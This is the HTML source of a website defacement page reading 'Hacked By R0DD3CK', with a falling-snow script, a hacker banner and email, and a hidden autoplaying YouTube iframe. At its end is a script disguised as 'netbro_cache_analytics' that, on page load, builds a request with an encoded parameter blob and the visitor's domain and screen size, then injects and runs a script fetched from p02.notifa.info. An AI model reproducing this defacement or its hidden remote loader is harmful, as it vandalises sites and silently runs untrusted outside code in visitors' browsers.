
<title>R0DD3CK Blackhat</title>
<meta name="title" content="Hacked By R0DD3CK">
<meta name="description" content="sadboi@familyattackcyber ~">
<link rel="shortcut icon" href="https://www.iconarchive.com/download/i96281/iconsmind/outline/Halloween-HalfMoon.ico" type="image/x-icon">
<script>
var snowmax=40
var snowcolor=new Array("#aaaacc","#ddddFF","#ccccDD")
var snowtype=new Array("Arial Black")
var snowletter="*"
var sinkspeed=0.6
var snowmaxsize=30
var snowminsize=8
var snowingzone=1
var snow=new Array()
var marginbottom
var marginright
var timer
var i_snow=0
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent 
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
var ns6=document.getElementById&&!document.all
var opera=browserinfos.match(/Opera/)  
var browserok=ie5||ns6||opera

function randommaker(range) {        
    rand=Math.floor(range*Math.random())
    return rand
}

function initsnow() {
    if (ie5 || opera) {
        marginbottom = document.body.clientHeight
        marginright = document.body.clientWidth
    }
    else if (ns6) {
        marginbottom = window.innerHeight
        marginright = window.innerWidth
    }
    var snowsizerange=snowmaxsize-snowminsize
    for (i=0;i<=snowmax;i++) {
        crds[i] = 0;                      
        lftrght[i] = Math.random()*15;         
        x_mv[i] = 0.03 + Math.random()/10;
        snow[i]=document.getElementById("s"+i)
        snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
        snow[i].size=randommaker(snowsizerange)+snowminsize
        snow[i].style.fontSize=snow[i].size
        snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
        snow[i].sink=sinkspeed*snow[i].size/5
        if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
        if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
        if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
        if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
        snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
        snow[i].style.left=snow[i].posx
        snow[i].style.top=snow[i].posy
    }
    movesnow()
}

function movesnow() {
    for (i=0;i<=snowmax;i++) {
        crds[i] += x_mv[i];
        snow[i].posy+=snow[i].sink
        snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
        snow[i].style.top=snow[i].posy
        
        if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
            if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
            if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
            if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
            if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
            snow[i].posy=0
        }
    }
    var timer=setTimeout("movesnow()",50)
}

for (i=0;i<=snowmax;i++) {
    document.write("<span id='s"+i+"' style='position:absolute;center:-"+snowmaxsize+"'>"+snowletter+"</span>")
}
if (browserok) {
    window.onload=initsnow
}
</script>
</head><body><body bgcolor="black">
<table width="100%" height="100%"><td align="center">
<font color="white"><h1>Hacked By R0DD3CK</h1><header><br><img src="https://media.giphy.com/media/3oriNM8HF8oijarwre/giphy.gif" width="25%"><br><h2>pwndzz!?</h2><p><h3>yurinesia@naver.com</h3><p>
<iframe width="0" height="0" src="https://www.youtube.com/embed/8HuVNxmHdvE?list=OLAK5uy_ktKLOeo5nABPmdxrQadWCkRHHUhqlEkrk&index=11&autoplay=1&loop=1" frameborder="0" allowfullscreen type="application/x-shockwave-flash" wmode="transparent"></iframe><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX0eS%2blIsjpHib8TtxjI5fL4CnAk3oUjAXnW5uViTMOApyRkR1%2fUBXpJrF%2f3Lgn5cSssrPJBcMGJ4Gdirt1NSIRigSkaOyzPLrXoE36XgQ2ggm9lD43ygi7YJES70WG0Ws%2bxTjm%2bSyjQwToICcn9syrzZgIKKy6VptlZCswro4KloxHYBQ6bhhG81HBsv6cxqV%2bn%2fM12kG%2fZK1T8fkJQyScEsDvCH0SbDRKDKv%2f3Xtp6nbNfQ4j66Dx6DOTUbghphr7Dyu2GAYwGU3rvreowVOiMTA0dXgQzCZGMaUPVYfhhovxniTFxtI3B%2fjJZMbnLLXpd1fyIic5IDKdit2VWrPUDHEFYT2bgivdQ7ncqzTB6UgaGy6rQWCZbC3L3dLuPC8%2bAGFgGnlAxsIknWrIjR2HkKdS8IX0m6%2fvG32hY7838YoU%2b0gxicmqDtfJe6zjmNs9lfsfNa%2bfRqUghy8WxUF0Gapb48IuwdPMvZ5K1CznaEIvUHqh6IbuGIx7ks6VqNrYOJHjzWkELyOc8nta4%2bj7f3h5%2bBEGV5CyOH3MNavMCAI34WUBdQJrbIaPto2hJEO" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</footer>
